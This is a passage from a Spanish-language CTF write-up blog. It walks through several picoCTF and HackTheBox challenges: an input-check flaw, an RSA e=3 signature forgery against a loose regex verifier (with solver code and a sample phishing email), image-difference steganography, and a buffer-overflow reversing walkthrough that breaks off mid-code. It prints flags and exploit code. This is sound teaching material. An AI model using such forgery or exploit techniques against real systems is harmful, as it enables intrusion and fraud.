{ data_write(); puts(\"Write successful, would you like to do anything else?\"); } else if (command == 2) { if (inputs == 0) { puts(\"No data yet\"); continue; } data_read(); puts(\"Read successful, would you like to do anything else?\"); } else if (command == 3) { return 0; } else { puts(\"Please type either 1, 2 or 3\"); puts(\"Maybe breaking boundaries elsewhere will be helpful\"); } } return 0; }  La parte importante es esta:\nprintf(\"Please enter the entry number of your data:\\n\"); // ... if ((entry_number = strtol(entry, NULL, 10)) == 0) { puts(flag); fseek(stdin, 0, SEEK_END); exit(0); }  Por tanto, si ponemos un 0 en \u0026ldquo;entry number your data\u0026rdquo;, obtendremos la flag. Necesitamos añadir algunos datos antes de mostrar la flag:\n$ nc saturn.picoctf.net 53641 Hi, welcome to my echo chamber! Type '1' to enter a phrase into our database Type '2' to echo a phrase in our database Type '3' to exit the program 1 1 Please enter your data: asdf asdf Please enter the length of your data: 4 4 Your entry number is: 1 Write successful, would you like to do anything else? 2 2 Please enter the entry number of your data: 0 0 picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_C5BC1889}  ","image":"/images/pwn.png","permalink":"https://7rocky.github.io/ctf/picoctf/binary-exploitation/basic-file-exploit/","section":"ctf","summary":"picoCTF 2022. 100 puntos. Explotación de un error de código","time":3,"title":"basic-file-exploit"},{"contents":"Se nos proporciona un código fuente en Python que nos pregunta por una firma. Esta es la función main:\ndefmain(s): rsa=RSA(2048) user, data=parseEmail() signature=rsa.sign(user) rsa.verify(user, signature) headers=generateHeaders(rsa, signature) valid_email=headers+data sendMessage(s, valid_email+\"\\n\\n\") try: forged_signature=recieveMessage(s, \"Enter the signature as hex: \") forged_signature=bytes.fromhex(forged_signature) ifnotrsa.verify(user, forged_signature): sendMessage(s, \"Invalid signature\") ifdifferent(rsa, signature, forged_signature): sendMessage(s, FLAG) except: sendMessage(s, \"An error occured\")  La función rsa.verify hace esto:\ndefverify(self, message, signature): keylength=len(long_to_bytes(self.n)) decrypted=self.encrypt(signature) clearsig=decrypted.to_bytes(keylength, \"big\") r=re.compile(b'\\x00\\x01\\xff+?\\x00(.{15})(.{20})', re.DOTALL) m=r.match(clearsig) ifnotm: raiseVerificationError('Verification failed') ifm.group(1) !=self.asn1: raiseVerificationError('Verification failed') ifm.group(2) !=sha1(message).digest(): raiseVerificationError('Verification failed')  Ejecuta self.encrypt, que será $s ^ e \\pmod{n}$, donde $s$ es la firma, $e$ es el exponente público y $n$ es el módulo público.\nTenemos $n$ y $e$ porque el servidor envía estos valores en formato PEM:\n$ nc 127.0.0.1 1337 signature: 6d0367ad7e069a4eef22535a8fa5df13e9701b31c94d30db5905e7923535835463b8673ed13fe3b6eefcfdd6074d76bbb9ec95022f56049137282aa8ab01b25956884b18116d052fc16aed4af66bfda92ca64575f46c03fbc322de10fb8518edfe3d09020b3c109e438108edcdc7fbb33d34b6f4da745c0cec157b06ad7939e66edf89c6681aef841574dfccd98a803ba583e488b528df1501e717edcf4047ee8f2bc18556c1f41f89385fe68ef7af2ee2e132f7042e9aed724cc6659310db8153756d16f9da99662ac7d5abb8e00d64735ac544f8f57d5519e3edae3824db913aa67d8bfc64afbeb1787f56c455ffb1198fb2da5b40ea67cd0d810e8015ac4b certificate: -----BEGIN PUBLIC KEY----- MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKCAQEAnxwOqoIroFTNdDdVS13C I8wDj4H/3bI8T6wSMaL5GE4GLjgz33szj+u1XPxUb0vfdMxkfcTsvtYP9oZtPX3L FMsi8KnrpvlqTzPNbKDO6Ga1viO3C6GPKIJwDyXzWI2IxnSrDHjty30dbKl1lO9E XXWMj7GXFFVOBDnPfxWFwyMUnJc/oooyDF2vVpwvmIWFTfxRLMrmJpeHlA9Vg94A Ype/CkbURdckwFJt0Yvp0wFFRrVhsQeFlIrq0GQtSif8YlIAjyANTAqNDoKS0fq5 Fc3388Gt2D04JNcny7qjmxWuPcnn+2PZaog10K4YrjK8ZVtptwl97f06CuktB14C jQIBAw== -----END PUBLIC KEY----- From: IT Department \u0026lt;it@cloudcompany.com\u0026gt; To: j.smith@sheesh.gov.edu Subject: Confirm your identity Hello there, You have recently changed the password for your CloudCompany account. Please verify your account using the link below to confirm your identity: https://ccloud.cloudcompany.co/confirm-identity/5912031940529412 Below are some common reasons for unwanted or irregular activity: - Unauthorized or unexpected resource activity - An unpatched CloudCompany Elastic Compute Cloud (CCEC2) instance could be infected and become a botnet agent. - Exposed credentials or access keys. - Unintentional misuse - An end user of a service provided by an CloudCompany customer might post malware files to a public S1 bucket. - False complaints - Sometimes Internet users falsely report legitimate activities as misuse. Thank you for your patience while we work on this case. We appreciate your feedback. Please share your experience by rating this correspondence using the CloudCompany Support Center link at the bottom of this correspondence. Each correspondence can also be rated by selecting the stars in the upper right corner of each correspondence in the CloudCompany Support Center. Best regards, CloudCompany \u0026lt;img width=396 height=129 id=\"1\" src=\"cid:Logo.jpg\"\u0026gt; Enter the signature as hex:  Además, una vez que se descifra la firma, el servidor usa una expresión regular para parsear los bytes descifrados.\nUsando la siguiente instrucción en Python, podemos ver cuál es el payload que se está firmando:\nprint(f'{clearsig= }')  $ python3 server.py clearsig = b'\\x00\\x01\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x000!0\\t\\x06\\x05+\\x0e\\x03\\x02\\x1a\\x05\\x00\\x04\\x14\\xdb}\\xdd?yeA\\xdaO\\x80]yHo\\xd3w\\x07\\x9c2p'  Nótese que la expresión regular no mira el número de bytes \u0026quot;\\xff\u0026quot;, pero mira que la cadena descifrara comienza por \u0026quot;\\x00\\x01\\xff\u0026quot; y su longitud es de 256 bytes. Por tanto, podemos pasar la expresión regular poniendo menos bytes \u0026quot;\\xff\u0026quot; y rellenando la cadena por el final. Por ejemplo:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; clearsig = b'\\x00\\x01\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x000!0\\t\\x06\\x05+\\x0e\\x03\\x02\\x1a\\x05\\x00\\x04\\x14\\xdb}\\xdd?yeA\\xdaO\\x80]yHo\\xd3w\\x07\\x9c2p' \u0026gt;\u0026gt;\u0026gt; clearsig.count(b'\\xff') 218 \u0026gt;\u0026gt;\u0026gt; len(clearsig) 256 \u0026gt;\u0026gt;\u0026gt; import re \u0026gt;\u0026gt;\u0026gt; r = re.compile(b'\\x00\\x01\\xff+?\\x00(.{15})(.{20})', re.DOTALL) \u0026gt;\u0026gt;\u0026gt; m = r.match( b'\\x00\\x01' + b'\\xff' * 218 + b'\\x000!0\\t\\x06\\x05+\\x0e\\x03\\x02\\x1a\\x05\\x00\\x04\\x14\\xdb}\\xdd?yeA\\xdaO\\x80]yHo\\xd3w\\x07\\x9c2p') \u0026gt;\u0026gt;\u0026gt; m.groups() (b'0!0\\t\\x06\\x05+\\x0e\\x03\\x02\\x1a\\x05\\x00\\x04\\x14', b'\\xdb}\\xdd?yeA\\xdaO\\x80]yHo\\xd3w\\x07\\x9c2p') \u0026gt;\u0026gt;\u0026gt; m = r.match((b'\\x00\\x01' + b'\\xff' * 1 + b'\\x000!0\\t\\x06\\x05+\\x0e\\x03\\x02\\x1a\\x05\\x00\\x04\\x14\\xdb}\\xdd?yeA\\xdaO\\x80]yHo\\xd3w\\x07\\x9c2p').ljust(256, b'\\0')) \u0026gt;\u0026gt;\u0026gt; m.groups() (b'0!0\\t\\x06\\x05+\\x0e\\x03\\x02\\x1a\\x05\\x00\\x04\\x14', b'\\xdb}\\xdd?yeA\\xdaO\\x80]yHo\\xd3w\\x07\\x9c2p')  Solo tenemos que encontrar un número $t$ de forma que $t ^ 3$ (recordemos que $e = 3$) pase la verificación de la expresión regular.\nEntonces, con este código podemos obtener dicho valor $t$:\nforged_min=int((b'\\x00\\x01'+b'\\xff'*1+b'\\x000!0\\t\\x06\\x05+\\x0e\\x03\\x02\\x1a\\x05\\x00\\x04\\x14\\xdb}\\xdd?yeA\\xdaO\\x80]yHo\\xd3w\\x07\\x9c2p').ljust(256, b'\\x00').hex(), 16) forged_max=int((b'\\x00\\x01'+b'\\xff'*217+b'\\x000!0\\t\\x06\\x05+\\x0e\\x03\\x02\\x1a\\x05\\x00\\x04\\x14\\xdb}\\xdd?yeA\\xdaO\\x80]yHo\\xd3w\\x07\\x9c2p').ljust(256, b'\\xff').hex(), 16) perfect_cube_range=range(iroot(forged_min, e)[0], iroot(forged_max, e)[0]) regex=re.compile(b'\\x00\\x01\\xff+?\\x00(.{15})(.{20})', re.DOTALL) keylength=len(long_to_bytes(n)) fortinperfect_cube_range: clearsig=(t**e).to_bytes(keylength, 'big') m=regex.match(clearsig) ifmandm.groups() ==(b'0!0\\t\\x06\\x05+\\x0e\\x03\\x02\\x1a\\x05\\x00\\x04\\x14', b'\\xdb}\\xdd?yeA\\xdaO\\x80]yHo\\xd3w\\x07\\x9c2p'): break r.sendafter(b'Enter the signature as hex: ', hex(t)[2:].encode()) log.success(f'Flag: {r.recv().decode()}') r.close()  Usando este script: solve.py podemos obtener la flag:\n$ python3 solve.py 178.62.23.240:30323 [+] Opening connection to 178.62.23.240 on port 30323: Done [+] Flag: HTB{4_8131ch3n84ch32_254_vu1n} [*] Closed connection to 178.62.23.240 port 30323  ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/crypto/bbgun06/","section":"ctf","summary":"RSA. Falsificación de firma. Bypass de expresión regular","time":2,"title":"BBGun06"},{"contents":"Se nos proporcionan dos imágenes PNG intercepted.png y original.png:\n$ file intercepted.png intercepted.png: PNG image data, 775 x 550, 8-bit/color RGB, non-interlaced $ file original.png original.png: PNG image data, 775 x 550, 8-bit/color RGB, non-interlaced  Ambas imágenes parecen iguales visualmente:\nPero realmente son diferentes porque sus hashes MD5 no coinciden:\n$ md5sum intercepted.png 88e9b5b97e4a615f1aa26d11dbcdec0d intercepted.png $ md5sum original.png 04e2562c19e680b6493b2a31d65c51e3 original.png  Entonces, podemos deducir que hay algún tipo de esteganografía aplicada en intercepted.png. Como se trata de una imagen PNG, podríamos pensar en zsteg, pero no funciona de momento.\nComo las imágenes PNG no pierden ningún dato al comprimirse, podemos operar las imágenes a nivel de píxel (por ejemplo, XOR o resta). Para obtener las diferencias entre ambos archivos, podemos usar este código simple en Python (solve.py):\n#!/usr/bin/env python3 importnumpyasnp fromPILimportImage defmain(): intercepted=np.array(Image.open('intercepted.png')) original=np.array(Image.open('original.png')) result=np.subtract(intercepted, original) Image.fromarray(result).save('result.png') if__name__=='__main__': main()  Si quisiéramos usar XOR, el método habría sido bitwise_xor en lugar de substract. La imagen resultante (result.png) parece completamente negra. Pero si ajustamos los colores, podremos ver unos píxeles raros a la izquierda:\nSi hacemos zoom, lo veremos mejor:\nEn este punto, al usar zsteg en result.png veremos un texto:\n$ python3 solve.py $ zsteg -a result.png b1,b,lsb,yx .. text: \"SFRCezFmX2FfdzAwZF9jaHVja19jMHVsZF9jaHVja193MDBkfQ==\" b2,rgb,msb,yx .. file: Applesoft BASIC program data, first line number 128 b2,bgr,msb,yx .. file: Targa image data - RLE 128 x 8 x 32 +32768 +32 \"�\" b4,b,lsb,yx .. file: PDP-11 UNIX/RT ldp b4,bgr,lsb,yx .. file: dBase IV DBT, block length 4096, next free block index 256, next free block 0, next used block 0 b5,rgb,lsb,yx .. file: X11 SNF font data, MSB first b6,rgb,lsb,yx .. file: GLS_BINARY_LSB_FIRST b6,bgr,lsb,yx .. file: Targa image data - Map 65536 x 64 x 16 b7,b,lsb,yx .. file: TTComp archive data, binary, 1K dictionary b7,rgb,msb,yx .. file: Matlab v4 mat-file (little endian) �, numeric, rows 512, columns 524288 b8,rgb,msb,yx .. file: Matlab v4 mat-file (little endian) , numeric, rows 32768, columns 2147483648 b1,rgb,msb,yx,prime .. file: Applesoft BASIC program data, first line number 146 b2,rgb,msb,yx,prime .. file: Applesoft BASIC program data, first line number 128 b4,b,lsb,yx,prime .. file: Targa image data - Map (17-4369) 273 x 4353 x 16 +4097 +256 - 1-bit alpha \"\" b4,rgb,lsb,yx,prime .. file: Targa image data - Map 65536 x 65536 x 16 +1 +272 - 1-bit alpha b5,rgb,lsb,yx,prime .. file: X11 SNF font data, MSB first b6,rgb,lsb,yx,prime .. file: GLS_BINARY_LSB_FIRST b6,bgr,lsb,yx,prime .. file: Targa image data - Map 65536 x 64 x 16 +256 b7,b,lsb,yx,prime .. file: TTComp archive data, binary, 1K dictionary b7,rgb,msb,yx,prime .. file: Matlab v4 mat-file (little endian) �, numeric, rows 512, columns 524288, imaginary b8,rgb,msb,yx,prime .. file: Matlab v4 mat-file (little endian) �, numeric, rows 32768, columns 2147483648 b1,b,lsb,Yx .. file: Matlab v4 mat-file (little endian) ���2r2Y�JZq�k9�J�Zr2Y�JZq�k�\tx���0jىz�\t)�(, numeric, rows 0, columns 0 b1,b,msb,Yx .. file: Matlab v4 mat-file (little endian) ٚQ�LNL��R�Z��֜R�ZNL��R�Z���]���� V��^ِ��, numeric, rows 0, columns 0  Y obtenemos una cadena de texto que parece codificada en Base64. Y aquí está la flag:\n$ echo SFRCezFmX2FfdzAwZF9jaHVja19jMHVsZF9jaHVja193MDBkfQ== | base64 -d HTB{1f_a_w00d_chuck_c0uld_chuck_w00d}  ","image":"/images/misc.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/misc/bitsnbytes/","section":"ctf","summary":"Resta de imágenes. Esteganografía con zsteg","time":2,"title":"BitsNBytes"},{"contents":"Se nos proporciona un binario de 32 bits llamado vuln:\nArch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)  No tenemos el código fuente del binario, y además está despojado:\n$ file vuln vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=836e2f666bd53c2307bff4801d330e444556a006, stripped  Realizar ingeniería inversa sobre el binario será más complicado ya que no tenemos los nombres de las funciones. Sin embargo, si lo abrimos en Ghidra, podemos identificar fácilmente la función main (la que se llama mediante __libc_start_main, dentro de una función llamada normalmente entry por Ghidra):\nvoid entry() { __libc_start_main(FUN_0814c22c); do { /* WARNING: Do nothing block with infinite loop */ } while (true); }  Ghidra nombrará las funciones con su dirección de memoria. Podemos renombrar una función mediante click derecho en el nombre, por lo que podemos llamar main a la función FUN_0814c22c. Este es el main entonces:\nvoid main() { setbuf(stdout,(char *) 0x0); FUN_0811d5b3(); FUN_0811d941(); puts(\"fizz\"); FUN_0811ead2(); puts(\"buzz\"); puts(\"fizz\"); FUN_0811fbb3(); FUN_08120828(); puts(\"fizz\"); puts(\"buzz\"); FUN_08121d33(); puts(\"fizz\"); FUN_08122908(); FUN_08122ea8(); puts(\"fizzbuzz\"); FUN_081237e9(); FUN_081241ca(); puts(\"fizz\"); FUN_081255ef(); puts(\"buzz\"); puts(\"fizz\"); FUN_08127392(); FUN_08127c08(); puts(\"fizz\"); puts(\"buzz\"); FUN_081294b8(); puts(\"fizz\"); FUN_0812a7b4(); FUN_0812b0ae(); puts(\"fizzbuzz\"); FUN_0812c368(); FUN_0812c6f6(); puts(\"fizz\"); FUN_0812d430(); puts(\"buzz\"); puts(\"fizz\"); FUN_0812edb3(); FUN_0812f1b9(); puts(\"fizz\"); puts(\"buzz\"); FUN_081309d7(); puts(\"fizz\"); FUN_08131dba(); FUN_08132072(); puts(\"fizzbuzz\"); FUN_0813282a(); FUN_0813326e(); puts(\"fizz\"); FUN_08133b70(); puts(\"buzz\"); puts(\"fizz\"); FUN_08135115(); FUN_081355d3(); puts(\"fizz\"); puts(\"buzz\"); FUN_08137124(); puts(\"fizz\"); FUN_08137f92(); FUN_08138931(); puts(\"fizzbuzz\"); FUN_0813979b(); FUN_08139ba1(); puts(\"fizz\"); FUN_0813ac2a(); puts(\"buzz\"); puts(\"fizz\"); FUN_0813ca30(); FUN_0813cf2e(); puts(\"fizz\"); puts(\"buzz\"); FUN_0813e2a2(); puts(\"fizz\"); FUN_0813f4d8(); FUN_0813fe56(); puts(\"fizzbuzz\"); FUN_08140c2e(); FUN_081413de(); puts(\"fizz\"); FUN_0814215d(); puts(\"buzz\"); puts(\"fizz\"); FUN_08142af1(); FUN_08143724(); puts(\"fizz\"); puts(\"buzz\"); FUN_081451af(); puts(\"fizz\"); FUN_08145c2a(); FUN_0814668f(); puts(\"fizzbuzz\"); FUN_081470c9(); FUN_08147792(); puts(\"fizz\"); FUN_0814868f(); puts(\"buzz\"); puts(\"fizz\"); FUN_0814a663(); FUN_0814ac03(); puts(\"fizz\"); puts(\"buzz\"); }  Una función peculiar, ¿no? Vamos a ver la primera función que se está llamando (FUN_0811d5b3):\nvoid FUN_0811d5b3() { int iVar1; iVar1 = FUN_080486b1(4); if (iVar1 != 4) { FUN_081451af(); iVar1 = FUN_080486b1(4); if (iVar1 != 4) { FUN_0812d430(); iVar1 = FUN_080486b1(10); if (iVar1 != 10) { FUN_0812d430(); iVar1 = FUN_080486b1(7); if (iVar1 != 7) { FUN_08140c2e(); iVar1 = FUN_080486b1(0x11); if (iVar1 != 0x11) { FUN_0811d5b3(); iVar1 = FUN_080486b1(2); if (iVar1 != 2) { FUN_0813e2a2(); iVar1 = FUN_080486b1(0xe); if (iVar1 != 0xe) { FUN_0813fe56(); iVar1 = FUN_080486b1(6); if (iVar1 != 6) { FUN_08137124(); iVar1 = FUN_080486b1(0xe); if (iVar1 != 0xe) { FUN_08142af1(); iVar1 = FUN_080486b1(2); if (iVar1 != 2) { FUN_08127392(); iVar1 = FUN_080486b1(0xc); if (iVar1 != 0xc) { FUN_0812f1b9(); iVar1 = FUN_080486b1(3); if (iVar1 != 3) { FUN_08146b6b(); iVar1 = FUN_080486b1(0x11); if (iVar1 != 0x11) { FUN_0812edb3(); iVar1 = FUN_080486b1(8); if (iVar1 != 8) { FUN_081309d7(); iVar1 = FUN_080486b1(0x11); if (iVar1 != 0x11) { FUN_08140c2e(); iVar1 = FUN_080486b1(9); if (iVar1 != 9) { FUN_0814ac03(); iVar1 = FUN_080486b1(0x11); if (iVar1 != 0x11) { FUN_0812b0ae(); iVar1 = FUN_080486b1(0x12); if (iVar1 != 0x12) { FUN_0814668f(); iVar1 = FUN_080486b1(0xb); if (iVar1 != 0xb) { FUN_080fc4b8(); iVar1 = FUN_080486b1(0x11); if (iVar1 != 0x11) { FUN_0811ead2(); iVar1 = FUN_080486b1(3); if (iVar1 != 3) { FUN_08142af1(); iVar1 = FUN_080486b1(4); if (iVar1 != 4) { FUN_08120828(); iVar1 = FUN_080486b1(7); if (iVar1 != 7) { FUN_0813ac2a(); iVar1 = FUN_080486b1(7); if (iVar1 != 7) { FUN_08127392(); iVar1 = FUN_080486b1(6); if (iVar1 != 6) { FUN_08138931(); iVar1 = FUN_080486b1(10); if (iVar1 != 10) { FUN_08147792(); iVar1 = FUN_080486b1(0xc); if (iVar1 != 0xc) { FUN_08140c2e(); iVar1 = FUN_080486b1(0xc); if (iVar1 != 0xc) { FUN_0811d941(); iVar1 = FUN_080486b1(3); if (iVar1 != 3) { FUN_0812d430(); iVar1 = FUN_080486b1(2); if (iVar1 != 2) { FUN_0814868f(); } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } }  Muy extraña. De todas formas, esta función extraña está llamando varias veces a la función FUN_080486b1, que parece más agradable:\nuint FUN_080486b1(uint param_1) { int iVar1; uint uVar2; char acStack30[9]; undefined local_15; size_t local_14; uint local_10; local_10 = 1; while (true) { while (true) { while (true) { if (param_1 \u0026lt;= local_10) { return local_10; } printf(\"%zu? \", local_10); __isoc99_scanf(\"%9s\", acStack30 + 1); local_15 = 0; local_14 = strnlen(acStack30 + 1, 8); if (acStack30[local_14] == '\\n') { acStack30[local_14] = '\\0'; } if (local_10 != (local_10 / 0xf) * 0xf) break; iVar1 = strncmp(acStack30 + 1, \"fizzbuzz\", 8); if (iVar1 != 0) { return local_10; } local_10 = local_10 + 1; } if (local_10 % 3 == 0) break; if (local_10 == (local_10 / 5) * 5) { iVar1 = strncmp(acStack30 + 1, \"buzz\", 8); if (iVar1 != 0) { return local_10; } local_10 = local_10 + 1; } else { uVar2 = strtol(acStack30 + 1, (char **) 0x0, 10); if (local_10 != uVar2) { return local_10; } local_10 = local_10 + 1; } } iVar1 = strncmp(acStack30 + 1, \"fizz\", 8); if (iVar1 != 0) break; local_10 = local_10 + 1; } return local_10; }  Esta es una función importante, decidí renombrarla como get_some_data. Si la analizamos, podemos deducir lo que está haciendo. Por razones de legibilidad, se puede traducir a código Python:\ndef get_some_data(param_1: int) -\u0026gt; int: local_10 = 1 while True: while True: while True: if param_1 \u0026lt;= local_10: return local_10 acStack30 = input(f'{local_10}? ').strip() if local_10 % 15 != 0: break if acStack30 != 'fizzbuzz': return local_10 local_10 += 1 if local_10 % 3 == 0: break if local_10 % 5 != 0: if acStack30 != 'buzz': return local_10 local_10 += 1 elif acStack30 != str(local_10): return local_10 local_10 += 1 if acStack30 != 'fizz': return local_10 local_10 += 1  Todavía es difícil de leer. Si la simplificamos un poco más, tenemos la siguiente función:\ndef get_some_data(param_1: int) -\u0026gt; int: for local_10 in range(1, param_1): acStack30 = input(f'{local_10}? ').strip() if local_10 % 15 == 0: if acStack30 != 'fizzbuzz': return local_10 elif local_10 % 3 == 0: if acStack30 != 'fizz': return local_10 elif local_10 % 5 == 0: if acStack30 != 'buzz': return local_10 elif acStack30 != str(local_10): return local_10 return param_1  Mucho mejor, ¿no? Básicamente, está jugando a FizzBuzz, que es un juego en el que hay que decir \u0026ldquo;fizzbuzz\u0026rdquo; si el número es múltiplo de 15 (3 por 5), \u0026ldquo;fizz\u0026rdquo; si es múltiplo de 3, \u0026ldquo;buzz\u0026rdquo; si es múltiplo de 5 o el propio número si no es múltiplo de 3 ni de 5.\nPodemos probarlo en el REPL de Python:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; get_some_data(5) 1? 1 2? 2 3? fizz 4? 4 5 \u0026gt;\u0026gt;\u0026gt; get_some_data(8) 1? 1 2? 2 3? fizz 4? 4 5? buzz 6? fizz 7? 7 8 \u0026gt;\u0026gt;\u0026gt; get_some_data(8) 1? 0 1 \u0026gt;\u0026gt;\u0026gt; get_some_data(8) 1? 1 2? 0 2 \u0026gt;\u0026gt;\u0026gt; get_some_data(8) 1? 1 2? 2 3? 0 3  Ahora tenemos una idea más clara de lo que hace la función: tenemos que seguir el juego hasta el final si queremos que devuelva el mismo número que se le pasa como argumento (param_1), o romper el juego en otro número si necesitamos que devuelva otro valor.\nVamos a ver otra vez la primera función llamada en el main (mostrada anteriormente también FUN_0811d5b3):\nvoid FUN_0811d5b3() { int iVar1; iVar1 = get_some_data(4); if (iVar1 != 4) { FUN_081451af(); iVar1 = get_some_data(4); if (iVar1 != 4) { FUN_0812d430(); iVar1 = get_some_data(10); if (iVar1 != 10) { FUN_0812d430(); iVar1 = get_some_data(7); if (iVar1 != 7) { // more stuff } } } } }  Esta función extraña llama a get_some_data(4), y si el valor devuelto es 4, no entramos en el bloque if y salimos de la función extraña FUN_0811d5b3.\nLuego, entraremos en otra función extraña (FUN_0811d941):\nvoid main() { setbuf(stdout,(char *) 0x0); FUN_0811d5b3(); FUN_0811d941(); puts(\"fizz\"); // more stuff }  Esta es parecida, pero llamando primero a get_some_data(7):\nvoid FUN_0811d941() { int iVar1; iVar1 = get_some_data(7); if (iVar1 != 7) { FUN_0814668f(); iVar1 = get_some_data(6); if (iVar1 != 6) { FUN_0811ead2(); iVar1 = get_some_data(5); if (iVar1 != 5) { // more stuff } } } }  Si pasamos estas dos funciones extrañas, el programa mostrará \u0026ldquo;fizz\u0026rdquo; en la consola. Vamos a comprobarlo:\n$ ./vuln 1? 1 2? 2 3? fizz 1? 1 2? 2 3? fizz 4? 4 5? buzz 6? fizz fizz 1?  Genial, pero aún tenemos que encontrar el buffer overflow. La descripción del reto dice que solamente hay uno.\nSi miramos las funciones de Glibc que utiliza el binario, vemos que solamente fgets y scanf (__isoc99_scanf) pueden leer de la entrada estándar (stdin):\n$ readelf -r vuln Relocation section '.rel.dyn' at offset 0x3dc contains 3 entries: Offset Info Type Sym.Value Sym. Name 08155ff4 00000506 R_386_GLOB_DAT 00000000 __gmon_start__ 08155ff8 00000806 R_386_GLOB_DAT 00000000 stdin@GLIBC_2.0 08155ffc 00000a06 R_386_GLOB_DAT 00000000 stdout@GLIBC_2.0 Relocation section '.rel.plt' at offset 0x3f4 contains 11 entries: Offset Info Type Sym.Value Sym. Name 0815600c 00000107 R_386_JUMP_SLOT 00000000 setbuf@GLIBC_2.0 08156010 00000207 R_386_JUMP_SLOT 00000000 printf@GLIBC_2.0 08156014 00000307 R_386_JUMP_SLOT 00000000 fgets@GLIBC_2.0 08156018 00000407 R_386_JUMP_SLOT 00000000 puts@GLIBC_2.0 0815601c 00000607 R_386_JUMP_SLOT 00000000 exit@GLIBC_2.0 08156020 00000707 R_386_JUMP_SLOT 00000000 __libc_start_main@GLIBC_2.0 08156024 00000907 R_386_JUMP_SLOT 00000000 fopen@GLIBC_2.1 08156028 00000b07 R_386_JUMP_SLOT 00000000 strnlen@GLIBC_2.0 0815602c 00000c07 R_386_JUMP_SLOT 00000000 __isoc99_scanf@GLIBC_2.7 08156030 00000d07 R_386_JUMP_SLOT 00000000 strncmp@GLIBC_2.0 08156034 00000e07 R_386_JUMP_SLOT 00000000 strtol@GLIBC_2.0  Si usamos Ghidra para buscar todas las referencias a fgets (se puede hacer yendo a .got.plt y haciendo click derecho en fgets), encontramos un montón de funciones raras que llaman a fgets muchas veces.\nAfortunadamente, la primera función que aparece en la lista muestra la flag\nvoid FUN_08048656() { char local_74[100]; FILE *local_10; local_10 = fopen(\"flag.txt\", \"r\"); fgets(local_74, 100, local_10); puts(local_74); /* WARNING: Subroutine does not return */ exit(0); }  Por tanto, renombré esta función como print_flag. Probablemente, esta será la función que tendremos que llamar después de explotar el buffer overflow (es decir, poner en $eip la dirección de print_flag, que es 0x08048656).\nEl resto de las funciones que utilizan fgets son raras, pero tienen una estructura similar:\nvoid FUN_0804883a() { char local_42[50]; int local_10; local_10 = get_some_data(0x21); if (local_10 == 1) { fgets(local_42, 0x28, stdin); } if (local_10 == 2) { fgets(local_42, 0x10, stdin); } if (local_10 != 3) { if (local_10 == 4) { fgets(local_42, 0x27, stdin); } if (local_10 != 5 \u0026amp;\u0026amp; local_10 != 6) { if (local_10 == 7) { fgets(local_42, 